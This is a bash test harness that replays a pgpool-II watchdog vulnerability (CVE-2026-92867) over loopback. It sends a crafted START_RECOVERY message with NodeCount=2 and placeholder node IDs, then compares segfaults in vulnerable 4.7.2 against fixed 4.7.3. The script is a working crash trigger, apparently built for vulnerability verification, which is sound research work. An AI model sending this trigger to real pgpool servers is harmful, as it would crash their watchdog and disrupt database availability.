#!/bin/bash
# CVE-2026-92867 wire replay: synthetic loopback watchdog peer against real
# pinned pgpool binaries. No non-loopback traffic; no external target.
# Prerequisites: pinned tarballs under lab/frontier/pgpool2shell/src/ (verify
# with SHA256SUMS) and the build produced by
# lab/frontier/pgpool2shell/harness/run.sh under $TMPDIR/w108-pgpool-replay.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
WORK="${TMPDIR:-/tmp}/w108-pgpool-replay"
VULN="$WORK/pgpool-II-4.7.2/src/pgpool"
FIXED="$WORK/pgpool-II-4.7.3/src/pgpool"

if [ ! -x "$VULN" ] || [ ! -x "$FIXED" ]; then
    echo "build pinned trees first: bash lab/frontier/pgpool2shell/harness/run.sh" >&2
    exit 2
fi
printf '0\n' > "$HERE/pgpool_node_id"

run_case() {
    local bin="$1" tag="$2" n="$3" v0="${4:-1094795585}" v1="${5:-1111638594}"
    local json="{\"Function\":\"START_RECOVERY\",\"Flags\":0,\"NodeCount\":$n,\"NodeIdList\":[$v0,$v1]}"
    local out="$HERE/evidence-$tag"
    rm -f "$out.stdout" "$out.peer" /tmp/w1-pgpool.pid
    python3 "$HERE/peer.py" 19005 "$json" >"$out.peer" 2>&1 &
    local peer=$!
    sleep 0.3
    "$bin" -n -D -f "$HERE/pgpool-vuln.conf" >"$out.stdout" 2>&1 &
    local pgpool=$!
    sleep 5
    local recv crash
    recv=$(grep -c 'watchdog received online recovery request' "$out.stdout" || true)
    crash=$(grep -c 'was terminated by segmentation fault' "$out.stdout" || true)
    echo "TAG=$tag N=$n received_recovery=$recv segfault_lines=$crash"
    grep -E 'watchdog received online recovery request|was terminated by segmentation fault|watchdog is recovering from the crash' "$out.stdout" || true
    kill "$pgpool" 2>/dev/null || true
    sleep 1
    kill -9 "$pgpool" 2>/dev/null || true
    kill "$peer" 2>/dev/null || true
    wait 2>/dev/null || true
}

echo "=== A: pinned 4.7.2, NodeCount=2 (wire trigger) ==="
run_case "$VULN" vuln-n2 2
echo "=== B: pinned 4.7.2, NodeCount=1 (safe input) ==="
run_case "$VULN" vuln-n1 1
echo "=== C: pinned 4.7.3, NodeCount=2 (fixed control) ==="
run_case "$FIXED" fixed-n2 2
